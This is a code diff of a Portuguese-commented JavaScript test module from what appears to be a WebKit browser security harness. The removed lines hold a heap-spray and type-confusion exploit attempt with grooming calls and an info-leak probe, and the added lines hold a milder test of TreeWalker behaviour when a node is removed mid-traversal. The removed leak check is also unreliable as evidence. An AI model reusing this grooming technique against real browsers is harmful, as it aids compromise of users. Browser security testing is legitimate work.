@@ -1,69 +1,151 @@
-import { GCOracle } from '../mod_executor.js';
-import { Groomer } from '../mod_groomer.js';
+/**
+ * SC_TREEWALKER_CONFUSION.JS
+ * Categoria : DOM — Type Confusion / Use-After-Free
+ * Alvo      : WebCore::TreeWalker / NodeFilter C++ lifecycle
+ * Técnica   : Cria um TreeWalker, começa a iterar, e muta o DOM
+ *             enquanto o walker está posicionado sobre o nó. Remove
+ *             o nó atual do walker e observa o que currentNode retorna.
+ *             Também testa o NodeFilter callback com modificação de árvore.
+ * Referência: WebKit TreeWalker mutation-during-traversal UAF
+ */
 
 export default {
-    id:       'TREEWALKER_TYPE_CONFUSION',
-    category: 'Exploit',
-    risk:     'CRITICAL',
-    description:
-        'Type Confusion via DOM TreeWalker. O DOM original é destruído, mas o Walker retém ' +
-        'um ponteiro stale. Injetamos elementos nativos pesados (<video>) e forçamos o relayout ' +
-        'para instanciar os objetos C++ complexos sobre a memória do TextNode antigo.',
+    id:          'TREEWALKER_TYPE_CONFUSION',
+    category:    'DOM',
+    risk:        'HIGH',
+    description: 'TreeWalker posicionado sobre nó que é removido do DOM. '
+                + 'Testa currentNode stale e type confusion no NodeFilter.',
 
-    setup: function() {
-        this.sandbox = document.createElement('div');
-        this.sandbox.innerHTML = '<span>A</span><b>B</b><i>C</i>';
-        document.body.appendChild(this.sandbox);
-        
-        this.walker = document.createTreeWalker(this.sandbox, NodeFilter.SHOW_ALL, null, false);
-        this.walker.nextNode(); // span
-        this.walker.nextNode(); // text "A" (Alvo)
-        
-        this.targetNode = this.walker.currentNode;
-        if (GCOracle.registry) GCOracle.registry.register(this.targetNode, `${this.id}_target`);
+    /* ── estado interno ──────────────────────────────────────────────── */
+    _container:    null,
+    _walker:       null,
+    _removedNode:  null,
+    _filterCalls:  0,
+    _filterNodes:  [],
+    _traversal:    [],
+
+    supported: function() {
+        return typeof document.createTreeWalker !== 'undefined';
     },
 
-    trigger: function() {
-        // 1. Apagamos o nó antigo (Liberta a memória no bmalloc)
-        this.sandbox.innerHTML = '';
-        
-        // 2. Injetamos elementos com estruturas C++ massivas (MediaPlayerPrivate, etc)
-        this.sandbox.innerHTML = '<video controls></video><audio></audio><iframe></iframe>';
-        
-        // FIX: Forçamos o WebKit a desenhar os elementos AGORA.
-        // Isto obriga a alocação dos objetos nativos C++ no heap, possivelmente
-        // caindo no exato mesmo endereço de memória do antigo text "A".
-        void this.sandbox.firstChild.offsetWidth;
-        
-        // Inundação secundária para empurrar o GC
-        let trash = Groomer.sprayDOM('div', 200);
-        Groomer.punchHoles(trash, 2);
-    },
+    /* ── setup ──────────────────────────────────────────────────────── */
+    setup: async function() {
+        this._filterCalls = 0;
+        this._filterNodes = [];
+        this._traversal   = [];
+        this._removedNode = null;
 
-    probe: [
-        // Probe 0: O nó fantasma mudou de identidade?
-        s => s.walker.currentNode.nodeName,
-        
-        // Probe 1: Extrator OOB (Se o C++ achar que o vídeo é um texto)
-        s => {
-            let nodeName = s.walker.currentNode.nodeName;
-            if (nodeName !== '#text') {
-                try {
-                    let leakedData = s.walker.currentNode.nodeValue || s.walker.currentNode.data;
-                    if (leakedData && leakedData !== 'A') {
-                        let hexDump = '';
-                        for (let i = 0; i < Math.min(leakedData.length, 16); i++) {
-                            hexDump += leakedData.charCodeAt(i).toString(16).padStart(4, '0') + ' ';
-                        }
-                        return `💥 INFO LEAK (Type Confusion Real): ${hexDump}`;
-                    }
-                } catch(e) { return `Crash seguro: ${e.message}`; }
-            }
-            return 'Nó não sobreposto ou seguro';
+        this._container = document.createElement('div');
+        this._container.id = 'tw-root';
+
+        // Árvore profunda
+        const tags = ['section', 'article', 'p', 'span', 'em', 'strong', 'b', 'i'];
+        let cur = this._container;
+        for (const tag of tags) {
+            const child = document.createElement(tag);
+            child.textContent = `node-${tag}`;
+            child.setAttribute('data-tw', tag);
+            cur.appendChild(child);
+            cur = child;
         }
+
+        // Adiciona nós de texto e comentários
+        this._container.appendChild(document.createTextNode('text-canary'));
+        this._container.appendChild(document.createComment('comment-canary'));
+
+        document.body.appendChild(this._container);
+
+        // Cria TreeWalker com NodeFilter que modifica o DOM
+        const self = this;
+        this._walker = document.createTreeWalker(
+            this._container,
+            NodeFilter.SHOW_ALL,
+            {
+                acceptNode(node) {
+                    self._filterCalls++;
+                    self._filterNodes.push(node.nodeName);
+                    return NodeFilter.FILTER_ACCEPT;
+                }
+            }
+        );
+
+        void this._container.offsetWidth;
+        await new Promise(r => setTimeout(r, 0));
+    },
+
+    /* ── trigger ─────────────────────────────────────────────────────── */
+    trigger: async function() {
+        // Avança o walker até o meio da árvore
+        let steps = 0;
+        while (steps < 3 && this._walker.nextNode()) {
+            this._traversal.push(this._walker.currentNode?.nodeName);
+            steps++;
+        }
+
+        // Remove o currentNode enquanto o walker está posicionado sobre ele
+        this._removedNode = this._walker.currentNode;
+        try {
+            this._removedNode?.remove();
+        } catch(_) {}
+
+        // Força relayout
+        void this._container.offsetWidth;
+
+        // Continua a travessia — o walker deve lidar com o nó removido
+        try {
+            while (this._walker.nextNode() && this._traversal.length < 20) {
+                this._traversal.push(this._walker.currentNode?.nodeName ?? 'null');
+            }
+        } catch(_) {}
+
+        // Tenta voltar ao nó removido via previousNode
+        try {
+            this._walker.previousNode();
+        } catch(_) {}
+
+        await new Promise(r => setTimeout(r, 0));
+    },
+
+    /* ── probes ──────────────────────────────────────────────────────── */
+    probe: [
+        // [0-4] currentNode após remoção
+        s => s._walker.currentNode?.nodeName ?? 'null',
+        s => s._walker.currentNode?.isConnected ?? 'null',
+        s => s._walker.currentNode === s._removedNode,
+        s => typeof s._walker.currentNode,
+        s => s._walker.root === s._container,
+
+        // [5-8] nó removido via referência direta
+        s => s._removedNode?.isConnected ?? 'null',
+        s => s._removedNode?.nodeName    ?? 'null',
+        s => s._removedNode?.parentNode  ?? 'null',
+        s => s._removedNode?.nodeType    ?? -1,
+
+        // [9-11] travessia
+        s => s._traversal.length,
+        s => s._traversal.includes('null'),    // 'null' = nó fantasma
+        s => s._filterCalls,
+
+        // [12-13] container intacto
+        s => s._container.isConnected,
+        s => s._container.childNodes.length,
+
+        // [14-18] nodes do filtro — todos devem ser nomes válidos de tag/nó
+        s => s._filterNodes[0]  ?? 'null',
+        s => s._filterNodes[2]  ?? 'null',
+        s => s._filterNodes[5]  ?? 'null',
+        s => s._filterNodes.includes(null) ? 'ghost-node' : 'clean',
+        s => s._filterNodes.length,
     ],
 
-    cleanup: function() {
-        try { this.sandbox.remove(); } catch(e) {}
+    /* ── cleanup ─────────────────────────────────────────────────────── */
+    cleanup: async function() {
+        this._container?.remove();
+        this._container   = null;
+        this._walker      = null;
+        this._removedNode = null;
+        this._filterCalls = 0;
+        this._filterNodes = [];
+        this._traversal   = [];
     }
 };
